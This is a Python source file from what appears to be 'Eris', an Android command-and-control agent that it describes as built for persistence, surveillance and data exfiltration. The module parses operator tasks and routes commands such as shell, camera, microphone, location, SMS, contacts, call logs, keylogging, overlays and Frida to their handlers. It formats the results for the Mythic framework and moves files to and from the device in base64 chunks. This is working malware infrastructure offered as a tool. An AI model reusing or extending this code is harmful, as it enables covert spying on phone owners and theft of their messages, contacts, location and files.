
"""
Eris - Mythic 3.3 Framework Integration Module

This module provides comprehensive integration with the Mythic 3.3 framework for the Eris Android Agent,
handling task parsing, response formatting, artifact collection, and file transfers
in compliance with Mythic framework standards.

Eris is a comprehensive Android Command & Control platform designed for advanced
persistence, surveillance, and data exfiltration capabilities.
"""

import json
import base64
import os
import time
import uuid
import hashlib
import mimetypes
from datetime import datetime
from typing import Dict, List, Any, Optional, Union, BinaryIO
from pathlib import Path
import asyncio

from utils.crypto import encrypt, decrypt


class MythicTaskParser:
    """Parse and validate Mythic tasks according to framework specifications"""
    
    REQUIRED_TASK_FIELDS = ["task_id", "command", "timestamp"]
    OPTIONAL_TASK_FIELDS = ["parameters", "token", "callback_id", "operator"]
    
    @staticmethod
    def parse_task(raw_task: Union[str, Dict]) -> Dict[str, Any]:
        """Parse incoming Mythic task with validation
        
        Args:
            raw_task: Raw task data from Mythic framework
            
        Returns:
            Parsed and validated task dictionary
            
        Raises:
            ValueError: If task format is invalid
        """
        try:
            if isinstance(raw_task, str):
                task = json.loads(raw_task)
            else:
                task = raw_task.copy()
            

            for field in MythicTaskParser.REQUIRED_TASK_FIELDS:
                if field not in task:
                    raise ValueError(f"Missing required field: {field}")
            

            normalized_task = {
                "task_id": str(task["task_id"]),
                "command": str(task["command"]).strip(),
                "timestamp": task["timestamp"],
                "parameters": task.get("parameters", {}),
                "token": task.get("token"),
                "callback_id": task.get("callback_id"),
                "operator": task.get("operator", "unknown"),
                "parsed_timestamp": datetime.now().isoformat()
            }
            

            if isinstance(normalized_task["parameters"], str):
                try:
                    normalized_task["parameters"] = json.loads(normalized_task["parameters"])
                except json.JSONDecodeError:

                    pass
            

            normalized_task["routing"] = MythicTaskRouter.determine_route(normalized_task)
            
            return normalized_task
            
        except Exception as e:
            raise ValueError(f"Failed to parse task: {str(e)}")
    
    @staticmethod
    def validate_parameters(command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Validate command parameters against known schemas
        
        Args:
            command: Command name
            parameters: Command parameters
            
        Returns:
            Validated parameters with defaults applied
        """

        parameter_schemas = {
            "screenshot": {
                "quality": {"type": int, "default": 80, "min": 1, "max": 100},
                "format": {"type": str, "default": "png", "choices": ["png", "jpg", "webp"]},
                "display_id": {"type": int, "default": 0, "min": 0}
            },
            "download": {
                "path": {"type": str, "required": True},
                "chunk_size": {"type": int, "default": 1024000, "min": 1024}
            },
            "upload": {
                "remote_path": {"type": str, "required": True},
                "file_data": {"type": str, "required": True},
                "permissions": {"type": str, "default": "644"}
            },
            "shell": {
                "command": {"type": str, "required": True},
                "timeout": {"type": int, "default": 30, "min": 1, "max": 300}
            }
        }
        
        schema = parameter_schemas.get(command, {})
        validated = {}
        
        for param_name, param_config in schema.items():
            if param_config.get("required", False) and param_name not in parameters:
                raise ValueError(f"Missing required parameter: {param_name}")
            
            if param_name in parameters:
                value = parameters[param_name]
                expected_type = param_config["type"]
                

                if not isinstance(value, expected_type):
                    try:
                        value = expected_type(value)
                    except (ValueError, TypeError):
                        raise ValueError(f"Invalid type for parameter {param_name}: expected {expected_type.__name__}")
                

                if expected_type == int:
                    if "min" in param_config and value < param_config["min"]:
                        value = param_config["min"]
                    if "max" in param_config and value > param_config["max"]:
                        value = param_config["max"]
                

                if "choices" in param_config and value not in param_config["choices"]:
                    raise ValueError(f"Invalid choice for {param_name}: {value}. Must be one of {param_config['choices']}")
                
                validated[param_name] = value
            elif "default" in param_config:
                validated[param_name] = param_config["default"]
        

        for param_name, value in parameters.items():
            if param_name not in validated:
                validated[param_name] = value
        
        return validated


class MythicTaskRouter:
    """Route tasks to appropriate modules and handlers"""
    
    COMMAND_MODULE_MAPPING = {

        "ls": "filesystem",
        "cat": "filesystem",
        "download": "filesystem",
        "upload": "filesystem",
        "rm": "filesystem",
        "mkdir": "filesystem",
        "pwd": "filesystem",
        

        "shell": "system",
        "ps": "system",
        "kill": "system",
        "whoami": "system",
        "id": "system",
        

        "screenshot": "surveillance",
        "camera": "surveillance",
        "microphone": "surveillance",
        "location": "surveillance",
        

        "sms": "communication",
        "call_log": "communication",
        "contacts": "communication",
        

        "frida": "frida_loader",
        "overlay": "overlay",
        "keylog": "keylogger"
    }
    
    @staticmethod
    def determine_route(task: Dict[str, Any]) -> Dict[str, Any]:
        """Determine routing information for a task
        
        Args:
            task: Parsed task dictionary
            
        Returns:
            Routing information dictionary
        """
        command = task["command"].lower()
        

        target_module = MythicTaskRouter.COMMAND_MODULE_MAPPING.get(command, "system")
        

        priority_mapping = {
            "screenshot": 1,
            "camera": 1,
            "location": 1,
            "shell": 2,
            "download": 2,
            "upload": 2,
            "ls": 3,
            "cat": 3
        }
        priority = priority_mapping.get(command, 2)
        

        special_handling = []
        if command in ["download", "upload", "screenshot", "camera"]:
            special_handling.append("file_transfer")
        if command in ["frida", "overlay"]:
            special_handling.append("advanced_permissions")
        if command in ["location", "microphone", "camera"]:
            special_handling.append("privacy_sensitive")
        
        return {
            "target_module": target_module,
            "priority": priority,
            "special_handling": special_handling,
            "estimated_duration": MythicTaskRouter._estimate_duration(command, task.get("parameters", {}))
        }
    
    @staticmethod
    def _estimate_duration(command: str, parameters: Dict) -> int:
        """Estimate task duration in seconds"""
        duration_estimates = {
            "screenshot": 2,
            "camera": 5,
            "location": 3,
            "shell": 10,
            "download": 30,
            "upload": 30,
            "ls": 1,
            "cat": 2
        }
        
        base_duration = duration_estimates.get(command, 5)
        

        if command == "shell":
            timeout = parameters.get("timeout", 30)
            return min(timeout, 300)
        
        return base_duration


class MythicResponseFormatter:
    """Format responses according to Mythic 3.3 framework standards"""
    
    def __init__(self, agent_id: str, callback_id: str = None):
        self.agent_id = agent_id
        self.callback_id = callback_id or agent_id
    
    def format_success_response(self, task_id: str, data: Any,
                              artifacts: List[Dict] = None,
                              file_data: bytes = None,
                              file_name: str = None) -> Dict[str, Any]:
        """Format successful task response
        
        Args:
            task_id: Task identifier
            data: Response data
            artifacts: List of artifacts collected
            file_data: Binary file data if applicable
            file_name: Name of file if file_data provided
            
        Returns:
            Formatted Mythic response
        """
        response = {
            "action": "post_response",
            "responses": [
                {
                    "task_id": task_id,
                    "status": "success",
                    "completed": True,
                    "user_output": self._format_user_output(data),
                    "artifacts": artifacts or [],
                    "timestamp": datetime.now().isoformat(),
                    "agent_id": self.agent_id,
                    "callback_id": self.callback_id
                }
            ]
        }
        

        if file_data and file_name:
            response["responses"][0]["download"] = {
                "total_chunks": 1,
                "chunk_num": 1,
                "chunk_data": base64.b64encode(file_data).decode(),
                "file_id": str(uuid.uuid4()),
                "filename": file_name
            }
        
        return response
    
    def format_error_response(self, task_id: str, error: str,
                            error_code: int = None) -> Dict[str, Any]:
        """Format error response
        
        Args:
            task_id: Task identifier
            error: Error message
            error_code: Optional error code
            
        Returns:
            Formatted Mythic error response
        """
        return {
            "action": "post_response",
            "responses": [
                {
                    "task_id": task_id,
                    "status": "error",
                    "completed": True,
                    "user_output": f"Error: {error}",
                    "error": error,
                    "error_code": error_code,
                    "timestamp": datetime.now().isoformat(),
                    "agent_id": self.agent_id,
                    "callback_id": self.callback_id
                }
            ]
        }
    
    def format_progress_response(self, task_id: str, progress: int,
                               status_message: str = None) -> Dict[str, Any]:
        """Format progress update response
        
        Args:
            task_id: Task identifier
            progress: Progress percentage (0-100)
            status_message: Optional status message
            
        Returns:
            Formatted Mythic progress response
        """
        return {
            "action": "post_response",
            "responses": [
                {
                    "task_id": task_id,
                    "status": "processing",
                    "completed": False,
                    "user_output": status_message or f"Progress: {progress}%",
                    "progress": progress,
                    "timestamp": datetime.now().isoformat(),
                    "agent_id": self.agent_id,
                    "callback_id": self.callback_id
                }
            ]
        }
    
    def _format_user_output(self, data: Any) -> str:
        """Format data for user output display"""
        if isinstance(data, str):
            return data
        elif isinstance(data, dict):
            if "output" in data:
                return data["output"]
            else:
                return json.dumps(data, indent=2)
        elif isinstance(data, list):
            return "\n".join(str(item) for item in data)
        else:
            return str(data)


class MythicArtifactCollector:
    """Collect and manage artifacts according to Mythic framework standards"""
    
    ARTIFACT_TYPES = {
        "file": "File.Write",
        "process": "Process.Create",
        "network": "Network.Connection",
        "registry": "Registry.Write",
        "credential": "Credential.Access",
        "screenshot": "Surveillance.Screenshot",
        "location": "Surveillance.Location",
        "sms": "Communication.SMS",
        "call": "Communication.Call"
    }
    
    def __init__(self, agent_id: str):
        self.agent_id = agent_id
        self.collected_artifacts = []
    
    def collect_file_artifact(self, file_path: str, operation: str = "read",
                            file_data: bytes = None) -> Dict[str, Any]:
        """Collect file system artifact
        
        Args:
            file_path: Path to file
            operation: Operation performed (read, write, delete)
            file_data: Optional file content
            
        Returns:
            Artifact dictionary
        """
        artifact = {
            "artifact_type": "file",
            "base_artifact": self.ARTIFACT_TYPES["file"],
            "artifact": {
                "path": file_path,
                "operation": operation,
                "timestamp": datetime.now().isoformat(),
                "agent_id": self.agent_id,
                "size": len(file_data) if file_data else None,
                "hash": hashlib.sha256(file_data).hexdigest() if file_data else None
            }
        }
        
        self.collected_artifacts.append(artifact)
        return artifact
    
    def collect_process_artifact(self, pid: int, process_name: str,
                               command_line: str = None) -> Dict[str, Any]:
        """Collect process artifact
        
        Args:
            pid: Process ID
            process_name: Process name
            command_line: Command line arguments
            
        Returns:
            Artifact dictionary
        """
        artifact = {
            "artifact_type": "process",
            "base_artifact": self.ARTIFACT_TYPES["process"],
            "artifact": {
                "pid": pid,
                "name": process_name,
                "command_line": command_line,
                "timestamp": datetime.now().isoformat(),
                "agent_id": self.agent_id
            }
        }
        
        self.collected_artifacts.append(artifact)
        return artifact
    
    def collect_network_artifact(self, destination: str, port: int,
                               protocol: str = "tcp") -> Dict[str, Any]:
        """Collect network connection artifact
        
        Args:
            destination: Destination IP or hostname
            port: Destination port
            protocol: Protocol (tcp/udp)
            
        Returns:
            Artifact dictionary
        """
        artifact = {
            "artifact_type": "network",
            "base_artifact": self.ARTIFACT_TYPES["network"],
            "artifact": {
                "destination": destination,
                "port": port,
                "protocol": protocol,
                "timestamp": datetime.now().isoformat(),
                "agent_id": self.agent_id
            }
        }
        
        self.collected_artifacts.append(artifact)
        return artifact
    
    def collect_surveillance_artifact(self, artifact_type: str, data: Dict) -> Dict[str, Any]:
        """Collect surveillance artifact (screenshot, location, etc.)
        
        Args:
            artifact_type: Type of surveillance (screenshot, location, etc.)
            data: Surveillance data
            
        Returns:
            Artifact dictionary
        """
        if artifact_type not in ["screenshot", "location"]:
            raise ValueError(f"Unknown surveillance type: {artifact_type}")
        
        artifact = {
            "artifact_type": artifact_type,
            "base_artifact": self.ARTIFACT_TYPES[artifact_type],
            "artifact": {
                **data,
                "timestamp": datetime.now().isoformat(),
                "agent_id": self.agent_id
            }
        }
        
        self.collected_artifacts.append(artifact)
        return artifact
    
    def get_artifacts(self, clear: bool = True) -> List[Dict[str, Any]]:
        """Get collected artifacts
        
        Args:
            clear: Whether to clear collected artifacts after retrieval
            
        Returns:
            List of collected artifacts
        """
        artifacts = self.collected_artifacts.copy()
        if clear:
            self.collected_artifacts.clear()
        return artifacts


class MythicFileTransferHandler:
    """Handle file transfers according to Mythic framework standards"""
    
    def __init__(self, agent_id: str, chunk_size: int = 1024000):
        self.agent_id = agent_id
        self.chunk_size = chunk_size
        self.active_transfers = {}
    
    def prepare_download(self, file_path: str) -> Dict[str, Any]:
        """Prepare file for download
        
        Args:
            file_path: Path to file to download
            
        Returns:
            Download preparation response
            
        Raises:
            FileNotFoundError: If file doesn't exist
            PermissionError: If file is not readable
        """
        try:
            path_obj = Path(file_path)
            if not path_obj.exists():
                raise FileNotFoundError(f"File not found: {file_path}")
            
            if not path_obj.is_file():
                raise ValueError(f"Path is not a file: {file_path}")
            
            file_size = path_obj.stat().st_size
            total_chunks = (file_size + self.chunk_size - 1) // self.chunk_size
            
            file_id = str(uuid.uuid4())
            

            self.active_transfers[file_id] = {
                "file_path": str(path_obj),
                "file_size": file_size,
                "total_chunks": total_chunks,
                "chunks_sent": 0,
                "started_at": datetime.now().isoformat()
            }
            
            return {
                "file_id": file_id,
                "filename": path_obj.name,
                "file_size": file_size,
                "total_chunks": total_chunks,
                "chunk_size": self.chunk_size,
                "mime_type": mimetypes.guess_type(str(path_obj))[0] or "application/octet-stream"
            }
            
        except Exception as e:
            raise RuntimeError(f"Failed to prepare download: {str(e)}")
    
    def get_download_chunk(self, file_id: str, chunk_num: int) -> Dict[str, Any]:
        """Get specific chunk of file for download
        
        Args:
            file_id: File transfer ID
            chunk_num: Chunk number (1-based)
            
        Returns:
            Chunk data response
            
        Raises:
            ValueError: If file_id is invalid or chunk_num is out of range
        """
        if file_id not in self.active_transfers:
            raise ValueError(f"Invalid file ID: {file_id}")
        
        transfer = self.active_transfers[file_id]
        
        if chunk_num < 1 or chunk_num > transfer["total_chunks"]:
            raise ValueError(f"Invalid chunk number: {chunk_num}")
        
        try:
            with open(transfer["file_path"], "rb") as f:

                f.seek((chunk_num - 1) * self.chunk_size)
                chunk_data = f.read(self.chunk_size)
                
                if not chunk_data:
                    raise ValueError(f"No data at chunk {chunk_num}")
                

                transfer["chunks_sent"] = max(transfer["chunks_sent"], chunk_num)
                
                return {
                    "file_id": file_id,
                    "chunk_num": chunk_num,
                    "total_chunks": transfer["total_chunks"],
                    "chunk_data": base64.b64encode(chunk_data).decode(),
                    "filename": Path(transfer["file_path"]).name,
                    "is_final_chunk": chunk_num == transfer["total_chunks"]
                }
                
        except Exception as e:
            raise RuntimeError(f"Failed to read chunk: {str(e)}")
    
    def handle_upload(self, file_path: str, file_data: str,
                     is_base64: bool = True) -> Dict[str, Any]:
        """Handle file upload
        
        Args:
            file_path: Destination path for uploaded file
            file_data: File content (base64 encoded by default)
            is_base64: Whether file_data is base64 encoded
            
        Returns:
            Upload result
        """
        try:

            if is_base64:
                try:
                    data = base64.b64decode(file_data)
                except Exception:
                    raise ValueError("Invalid base64 data")
            else:
                data = file_data.encode() if isinstance(file_data, str) else file_data
            

            dest_path = Path(file_path)
            dest_path.parent.mkdir(parents=True, exist_ok=True)
            

            with open(dest_path, "wb") as f:
                f.write(data)
            

            if not dest_path.exists():
                raise RuntimeError("File was not written successfully")
            
            file_size = dest_path.stat().st_size
            
            return {
                "file_path": str(dest_path),
                "file_size": file_size,
                "hash": hashlib.sha256(data).hexdigest(),
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            raise RuntimeError(f"Upload failed: {str(e)}")
    
    def cleanup_transfer(self, file_id: str):
        """Clean up completed transfer
        
        Args:
            file_id: File transfer ID to clean up
        """
        if file_id in self.active_transfers:
            del self.active_transfers[file_id]
    
    def get_transfer_status(self, file_id: str) -> Dict[str, Any]:
        """Get transfer status
        
        Args:
            file_id: File transfer ID
            
        Returns:
            Transfer status information
        """
        if file_id not in self.active_transfers:
            return {"status": "not_found"}
        
        transfer = self.active_transfers[file_id]
        progress = (transfer["chunks_sent"] / transfer["total_chunks"]) * 100
        
        return {
            "status": "active",
            "progress": progress,
            "chunks_sent": transfer["chunks_sent"],
            "total_chunks": transfer["total_chunks"],
            "file_size": transfer["file_size"],
            "started_at": transfer["started_at"]
        }


class MythicIntegration:
    """Main Mythic 3.3 framework integration class"""
    
    def __init__(self, agent_id: str, callback_id: str = None):
        self.agent_id = agent_id
        self.callback_id = callback_id or agent_id
        
        self.task_parser = MythicTaskParser()
        self.response_formatter = MythicResponseFormatter(agent_id, callback_id)
        self.artifact_collector = MythicArtifactCollector(agent_id)
        self.file_handler = MythicFileTransferHandler(agent_id)
        
    def process_task(self, raw_task: Union[str, Dict]) -> Dict[str, Any]:
        """Process incoming Mythic task
        
        Args:
            raw_task: Raw task from Mythic framework
            
        Returns:
            Processed task ready for execution
        """
        try:
            parsed_task = self.task_parser.parse_task(raw_task)
            

            if parsed_task["parameters"]:
                parsed_task["parameters"] = self.task_parser.validate_parameters(
                    parsed_task["command"],
                    parsed_task["parameters"]
                )
            
            return parsed_task
            
        except Exception as e:

            task_id = raw_task.get("task_id", "unknown") if isinstance(raw_task, dict) else "unknown"
            return {
                "task_id": task_id,
                "command": "error",
                "error": str(e),
                "routing": {"target_module": "error", "priority": 1}
            }
    
    def format_response(self, task_id: str, result: Any,
                       response_type: str = "success") -> Dict[str, Any]:
        """Format response for Mythic framework
        
        Args:
            task_id: Task identifier
            result: Task execution result
            response_type: Type of response (success, error, progress)
            
        Returns:
            Formatted Mythic response
        """
        artifacts = self.artifact_collector.get_artifacts()
        
        if response_type == "success":

            file_data = None
            file_name = None
            if isinstance(result, dict):
                file_data = result.get("file_data")
                file_name = result.get("file_name")
                if isinstance(file_data, str):
                    file_data = base64.b64decode(file_data)
            
            return self.response_formatter.format_success_response(
                task_id, result, artifacts, file_data, file_name
            )
        elif response_type == "error":
            error_msg = result if isinstance(result, str) else str(result)
            return self.response_formatter.format_error_response(task_id, error_msg)
        elif response_type == "progress":
            progress = result.get("progress", 0) if isinstance(result, dict) else 0
            message = result.get("message") if isinstance(result, dict) else None
            return self.response_formatter.format_progress_response(task_id, progress, message)
        else:
            raise ValueError(f"Unknown response type: {response_type}")
    
    def collect_artifact(self, artifact_type: str, **kwargs) -> Dict[str, Any]:
        """Collect artifact
        
        Args:
            artifact_type: Type of artifact to collect
            **kwargs: Artifact-specific data
            
        Returns:
            Collected artifact
        """
        if artifact_type == "file":
            return self.artifact_collector.collect_file_artifact(**kwargs)
        elif artifact_type == "process":
            return self.artifact_collector.collect_process_artifact(**kwargs)
        elif artifact_type == "network":
            return self.artifact_collector.collect_network_artifact(**kwargs)
        elif artifact_type in ["screenshot", "location"]:
            return self.artifact_collector.collect_surveillance_artifact(artifact_type, kwargs)
        else:
            raise ValueError(f"Unknown artifact type: {artifact_type}")
    
    def handle_file_operation(self, operation: str, **kwargs) -> Dict[str, Any]:
        """Handle file operations (upload/download)
        
        Args:
            operation: Operation type (upload, download, download_chunk)
            **kwargs: Operation-specific parameters
            
        Returns:
            Operation result
        """
        if operation == "download":
            return self.file_handler.prepare_download(kwargs["file_path"])
        elif operation == "download_chunk":
            return self.file_handler.get_download_chunk(kwargs["file_id"], kwargs["chunk_num"])
        elif operation == "upload":
            return self.file_handler.handle_upload(**kwargs)
        else:
            raise ValueError(f"Unknown file operation: {operation}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get integration status
        
        Returns:
            Status information
        """
        return {
            "agent_id": self.agent_id,
            "callback_id": self.callback_id,
            "active_transfers": len(self.file_handler.active_transfers),
            "collected_artifacts": len(self.artifact_collector.collected_artifacts),
            "mythic_version": "3.3",
            "integration_version": "1.0.0"
        }
